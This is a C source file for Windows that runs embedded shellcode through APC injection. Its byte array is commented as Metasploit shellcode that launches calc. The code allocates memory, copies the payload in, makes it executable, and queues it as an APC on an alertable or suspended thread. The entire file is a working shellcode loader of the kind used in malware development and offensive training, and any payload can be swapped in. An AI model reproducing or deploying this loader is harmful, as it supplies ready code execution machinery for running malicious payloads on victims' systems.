#include <Windows.h>
#include <stdio.h>


// if the following is defined, the code will run apc injection using a alertable sacrificial thread,
// else if it is commented, the program will create the sacrificial thread in a suspended state, to resume it later (and run the payload)
#define RUN_BY_ALERTABLETHREAD

// x64 calc metasploit shellcode 
unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};



// if RUN_BY_ALERTABLETHREAD is [not] defined (#ifndef) - then we are using an suspended thread to do apc injection

#ifndef RUN_BY_ALERTABLETHREAD

VOID DummyFunction() {

	// dummy code
	int		j = rand();
	int		i = j + rand();

}

#endif // !RUN_BY_ALERTABLETHREAD




// if RUN_BY_ALERTABLETHREAD is defined (#ifdef) - then we are using an alertable thread to do apc injection

#ifdef RUN_BY_ALERTABLETHREAD
// use one of the following to do apc injection through an alertable thread


VOID AlertableFunction1() {
	
	SleepEx(INFINITE, TRUE);
}

VOID AlertableFunction2() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		WaitForSingleObjectEx(hEvent, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}


VOID AlertableFunction3() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent){
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
}


VOID AlertableFunction4() {

	HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
	if (hEvent) {
		MsgWaitForMultipleObjectsEx(1, &hEvent, INFINITE, QS_KEY, MWMO_ALERTABLE);
		CloseHandle(hEvent);
	}
}


VOID AlertableFunction5() {
	
	HANDLE hEvent1	= CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2	= CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 && hEvent2) {
		SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
}
#endif // RUN_BY_ALERTABLETHREAD



/*
parameters: 
	- hThread is the handle of a alertable or suspended thread to use for apc injection
	- pPayload is the payload base address
	- sPayloadSize is the payload size
*/

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID		pAddress			= NULL;
	DWORD		dwOldProtection		= NULL;

	
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	
	printf("\t[i] Payload Written To : 0x%p \n", pAddress);

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	// if `hThread` is in an alertable state, QueueUserAPC will run the payload directly
	// if `hThread` is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}




int main(){


	HANDLE		hThread			= NULL;
	DWORD		dwThreadId		= NULL;

//-------------------------------------------------------------------------------------------

#ifndef RUN_BY_ALERTABLETHREAD
	hThread = CreateThread(NULL, NULL, &DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] Suspended Target Thread Created With Id : %d \n", dwThreadId);

#endif // !RUN_BY_ALERTABLETHREAD


#ifdef RUN_BY_ALERTABLETHREAD
	hThread = CreateThread(NULL, NULL, &AlertableFunction5, NULL, NULL, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
#endif // RUN_BY_ALERTABLETHREAD


//-------------------------------------------------------------------------------------------

	printf("[i] Running Apc Injection Function ... \n");
	if (!RunViaApcInjection(hThread, Payload, sizeof(Payload))) {
		return -1;
	}
	printf("[+] DONE \n");

//-------------------------------------------------------------------------------------------

#ifndef RUN_BY_ALERTABLETHREAD
	// resuming the thread in case we are targetting a suspended thread
	printf("[i] Resuming Thread ...");
	ResumeThread(hThread);
	printf("[+] DONE \n");
#endif // !RUN_BY_ALERTABLETHREAD

//-------------------------------------------------------------------------------------------


	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}

